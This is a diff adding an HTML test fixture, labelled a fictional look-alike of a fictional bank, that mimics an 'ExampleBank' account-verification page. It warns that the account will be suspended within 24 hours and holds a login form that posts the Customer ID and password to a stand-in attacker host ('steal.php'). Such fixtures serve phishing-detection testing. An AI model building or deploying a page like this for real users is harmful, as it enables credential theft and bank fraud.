@@ -1,0 +1,60 @@
+<!doctype html>
+<!-- FICTIONAL look-alike of the fictional ExampleBank, served on a different domain in tests. -->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>ExampleBank — Verify your account</title>
+    <style>
+      body {
+        font-family: system-ui, sans-serif;
+        background: #f4f6fb;
+        margin: 0;
+      }
+      .box {
+        max-width: 360px;
+        margin: 60px auto;
+        background: #fff;
+        padding: 28px;
+        border-radius: 12px;
+      }
+      h1 {
+        color: #1d3c8f;
+        font-size: 22px;
+      }
+      label {
+        display: block;
+        margin-top: 12px;
+      }
+      input {
+        width: 100%;
+        padding: 8px;
+        margin-top: 4px;
+        box-sizing: border-box;
+      }
+      button {
+        margin-top: 18px;
+        width: 100%;
+        padding: 10px;
+        background: #1d3c8f;
+        color: #fff;
+        border: 0;
+        border-radius: 6px;
+      }
+      .urgent {
+        color: #b42318;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <h1>ExampleBank Online</h1>
+      <p class="urgent">Your account will be suspended within 24 hours. Verify now.</p>
+      <form id="login" action="https://collector.attacker-example.test/steal.php" method="post">
+        <label>Customer ID <input id="user" name="user" /></label>
+        <label>Password <input id="pass" name="password" type="password" /></label>
+        <button type="submit">Verify</button>
+      </form>
+    </div>
+  </body>
+</html>
